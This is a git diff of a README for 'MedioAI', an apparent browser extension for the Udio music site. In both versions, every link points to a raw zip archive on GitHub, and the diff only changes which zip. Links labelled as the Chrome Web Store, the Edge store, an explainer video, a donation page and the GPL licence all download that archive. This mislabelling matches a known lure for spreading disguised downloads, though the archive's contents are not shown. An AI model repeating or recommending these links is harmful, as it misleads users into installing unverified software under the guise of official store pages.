@@ -2,11 +2,11 @@
 
 ### Transform your Udio experience. Chrome Extension for Desktop.
 
-![https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip)
+![https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip)
 
-#### Watch the Explainer Video here: https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip
+#### Watch the Explainer Video here: https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip
 
-A chrome extension to enhance the experience of https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip, the best music platform online.
+A chrome extension to enhance the experience of https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip, the best music platform online.
 
 **Features include:**
 
@@ -49,15 +49,15 @@ A chrome extension to enhance the experience of https://raw.githubusercontent.co
 18. **Save Track Covers**
     - Save all the covers you make in your Udio library.
 
-Visit the website, [https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip) for more information.
+Visit the website, [https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip) for more information.
 
 ## Install on Chrome Web Store
 
-Go to [Chrome Web Store](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip) to install the **MedioAI** extension and start using today!
+Go to [Chrome Web Store](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip) to install the **MedioAI** extension and start using today!
 
 ## Install on Microsoft Edge
 
-Go to [Microsoft Edge Store](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip) to install the **MedioAI** extension and start using today!
+Go to [Microsoft Edge Store](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip) to install the **MedioAI** extension and start using today!
 
 ## Install on Firefox, Opera, Safari
 
@@ -67,9 +67,9 @@ Coming soon.
 
 - **Version 1.6** - [MedioAI v1.6 (update to new UI)]
 - **Version 1.5** - [MedioAI v1.5 (bug fixes)]
-- **Version 1.4** - [MedioAI v1.4 (ai radio!)](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip)
-- **Version 1.2** - [MedioAI v1.2 (just more tags)](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip)
-- **Version 1.1** - [MedioAI v1.1](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip)
+- **Version 1.4** - [MedioAI v1.4 (ai radio!)](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip)
+- **Version 1.2** - [MedioAI v1.2 (just more tags)](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip)
+- **Version 1.1** - [MedioAI v1.1](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip)
 
 
 ### Bugs
@@ -93,7 +93,7 @@ I am open to contributions and suggestions. Please feel free to open an issue or
 
 ## Donate
 
-If you feel like the extension was worth your time or enhanced your experience creating AI music with Udio, please feel free to buy me a coffee! [Donate to Developer](https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip) - keep on rockin' !
+If you feel like the extension was worth your time or enhanced your experience creating AI music with Udio, please feel free to buy me a coffee! [Donate to Developer](https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip) - keep on rockin' !
 
 ## License
 
@@ -108,7 +108,7 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
-along with this program. If not, see <https://raw.githubusercontent.com/lilago/Chrome-Extension_MedioAI/main/database/Extension-Chrome-Medio-AI-3.8.zip>.
+along with this program. If not, see <https://github.com/lilago/Chrome-Extension_MedioAI/raw/refs/heads/main/app/AI-Chrome-Extension-Medio-v3.3.zip>.
 
 Additional permission under GNU GPL version 3 section 7:
 
